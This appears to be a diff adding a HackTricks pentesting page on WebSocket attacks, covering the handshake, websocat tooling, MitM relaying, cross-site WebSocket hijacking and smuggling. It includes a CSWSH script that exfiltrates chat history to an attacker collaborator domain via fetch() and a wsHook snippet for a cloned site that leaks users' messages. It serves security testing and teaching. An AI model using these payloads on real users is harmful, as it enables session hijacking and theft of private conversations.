@@ -1,0 +1,199 @@
+# WebSocket Attacks
+
+<details>
+
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
+
+## What are WebSockets
+
+WebSocket connections are initiated over **HTTP** and are typically **long-lived**. Messages can be sent in **either direction at any time** and are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a message.\
+WebSockets are particularly useful in situations where **low-latency or server-initiated messages** are required, such as real-time feeds of financial data.
+
+### How are WebSocket connections established?
+
+(Here you will find a summary but a **more detailed guide about how a web socket connection** is created can be found [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)).\
+WebSocket connections are normally created using client-side JavaScript like the following:
+
+```javascript
+var ws = new WebSocket("wss://normal-website.com/ws");
+```
+
+The **`wss`** protocol establishes a WebSocket over an encrypted **TLS** connection, while the **`ws`** protocol uses an **unencrypted** connection.
+
+To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
+
+```javascript
+GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket
+```
+
+If the server accepts the connection, it returns a WebSocket handshake response like the following:
+
+```javascript
+HTTP/1.1 101 Switching Protocols
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
+```
+
+At this point, the network connection remains open and can be used to send WebSocket messages in either direction.
+
+**Note**
+
+Several **features** of the WebSocket **handshake** messages are worth noting:
+
+* The **`Connection`** and **`Upgrade`** headers in the request and response **indicate** that this is a **WebSocket handshake**.
+* The **`Sec-WebSocket-Version`** request header specifies the **WebSocket protocol version** that the client wishes to use. This is typically `13`.
+* The **`Sec-WebSocket-Key`** request header contains a Base64-encoded **random value**, which should be randomly generated in each handshake request.
+* The **`Sec-WebSocket-Accept`** response header contains a hash of the value submitted in the `Sec-WebSocket-Key` request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
+
+The **`Sec-WebSocket-Key`** header contains a **random value** to prevent errors from caching proxies, and **is not used for authentication or session handling purposes** (_It's not a CSRF token_).
+
+### Linux console
+
+You can use `websocat` to establish a raw connection with a websocket.
+
+```bash
+websocat --insecure wss://10.10.10.10:8000 -v
+```
+
+Or to create a websocat server:
+
+```bash
+websocat -s 0.0.0.0:8000 #Listen in port 8000
+```
+
+### MitM websocket connections
+
+If you find that clients are connected to a **HTTP websocket** from your current local network you could try an [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)to perform a MitM attack between the client and the server.\
+Once the client is trying to connect to you can then use:
+
+```bash
+websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
+```
+
+### Websockets enumeration
+
+You can use the **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **to discover, fingerprint and search for known** **vulnerabilities** in websockets automatically.
+
+### Websocket Debug tools
+
+* **Burp Suite** supports MitM websockets communication in a very similar way it does it for regular HTTP communication.
+  * The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** will allow you to manage better Websocket communications in Burp by getting the **history**, setting **interception rules**, using **match and replace** rules, using **Intruder** and **AutoRepeater.**
+* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Short for "**WebSocket/Socket.io Proxy**", this tool, written in Node.js, provides a user interface to **capture, intercept, send custom** messages and view all WebSocket and Socket.IO communications between the client and server.
+* [**wsrepl**](https://github.com/doyensec/wsrepl) is an **interactive websocket REPL** designed specifically for penetration testing. It provides an interface for observing **incoming websocket messages and sending new ones**, with an easy-to-use framework for **automating** this communication.&#x20;
+* [**https://websocketking.com/**](https://websocketking.com/) it's a **web to communicate** with other webs using **websockets**.
+* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) among other types of communications/protocols, it provides a **web to communicate** with other webs using **websockets.**
+
+## Websocket Lab
+
+In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) you have a code to launch a web using websockets and in [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) you can find an explanation.
+
+## Cross-site WebSocket hijacking (CSWSH)
+
+Also known as _cross-origin WebSocket hijacking_.\
+**It is a** [**Cross-Site Request Forgery (CSRF)**](csrf-cross-site-request-forgery.md) **on a WebSocket handshake.**
+
+It arises when the **WebSocket handshake** request relies solely on **HTTP cookies** for session handling and does **not contain any CSRF tokens** or other unpredictable values.\
+An attacker can create a **malicious web page** on their own domain which **establishes a cross-site WebSocket** connection to the vulnerable application. The application will handle the connection in the **context of the victim user's session** with the application.
+
+### Simple Attack
+
+Note that when **establishing** a **websocket** connection the **cookie** is **sent** to the server. The **server** might be using it to **relate** each **specific** **user** with his **websocket** **session based on the sent cookie**.
+
+Then, if for **example** the **websocket** **server** **sends back the history of the conversation** of a user if a msg with "**READY"** is sent, then a **simple XSS** establishing the connection (the **cookie** will be **sent** **automatically** to authorise the victim user) **sending** "**READY**" will be able to **retrieve** the history of the **conversation**.:
+
+```markup
+<script>
+websocket = new WebSocket('wss://your-websocket-URL')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY"); //Send the message to retreive confidential information
+}
+function handleReply(event) {
+  //Exfiltrate the confidential information to attackers server
+  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
+}
+</script>
+```
+
+### Cross Origin + Cookie with a different subdomain
+
+In this blog post [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) the attacker managed to **execute arbitrary Javascript in a subdomain** of the domain where the web socket communication was occurring. Because it was a **subdomain**, the **cookie** was being **sent**, and because the **Websocket didn't check the Origin properly**, it was possible to communicate with it and **steal tokens from it**.
+
+### Stealing data from user
+
+Copy the web application you want to impersonate (the .html files for example) and inside the script where the websocket communication is occurring add this code:
+
+```javascript
+//This is the script tag to load the websocket hooker
+<script src='wsHook.js'></script>
+
+//These are the functions that are gonig to be executed before a message
+//is sent by the client or received from the server
+//These code must be between some <script> tags or inside a .js file
+wsHook.before = function(data, url) {
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "client_msg?m="+data, true);
+    xhttp.send();
+}
+wsHook.after = function(messageEvent, url, wsObject) {
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
+    xhttp.send();
+    return messageEvent;
+}
+```
+
+Now download the `wsHook.js` file from [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) and **save it inside the folder with the web files**.\
+Exposing the web application and making a user connect to it you will be able to steal the sent and received messages via websocket:
+
+```javascript
+sudo python3 -m http.server 80
+```
+
+## Race Conditions
+
+Race Conditions in WebSockets are also a thing, [check this information to learn more](race-condition.md#rc-in-websockets).
+
+## Other vulnerabilities
+
+As Web Sockets are a mechanism to **send data to server side and client side**, depending on how the server and client handles the information, **Web Sockets can be used to exploit several other vulnerabilities like XSS, SQLi or any other common web vuln using input of s user from a websocket.**
+
+## **WebSocket Smuggling**
+
+This vulnerability could allow you to **bypass reverse proxies restrictions** by making them believe that a **websocket communication was stablished** (even if it isn't true). This could allow an attacker to **access hidden endpoints**. For more information check the following page:
+
+{% content-ref url="h2c-smuggling.md" %}
+[h2c-smuggling.md](h2c-smuggling.md)
+{% endcontent-ref %}
+
+## References
+
+{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}
+
+<details>
+
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
